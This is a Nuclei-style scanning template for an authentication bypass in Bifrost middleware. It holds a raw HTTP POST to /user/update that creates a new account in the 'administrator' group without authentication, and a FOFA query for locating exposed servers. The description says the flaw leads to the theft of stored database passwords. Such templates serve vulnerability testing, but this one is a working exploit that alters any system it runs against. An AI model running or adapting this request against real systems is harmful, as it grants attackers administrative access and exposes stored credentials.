id: Bifrost-X-Requested-With-bypassauth

info:
  name: Bifrost-X-Requested-With-bypassauth
  author: linfeng7z
  severity: high
  description: Bifrost 中间件 X-Requested-With 存在身份认证绕过漏洞，未经身份认证的攻击者可未授权创建管理员权限账号，可通过删除请求头实现身份认证绕过，获取环境内配置各种数据库账户密码。
  tags: bifrost,bypassauth
  metadata:
    fofa-qeury: body="/dologin" && body="Bifrost"
    veified: true

variables:
  parameter: "{{to_lower(rand_text_alpha(8))}}"

http:
  - raw:
      - |
        POST /user/update HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Content-Type: application/json
        Accept-Encoding: gzip
         
        {"UserName":"{{parameter}}","Password":"{{parameter}}","Group":"administrator","Host":""}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "contains(body, 'success')"

      - type: status
        status:
          - 200
          - 302
        condition: or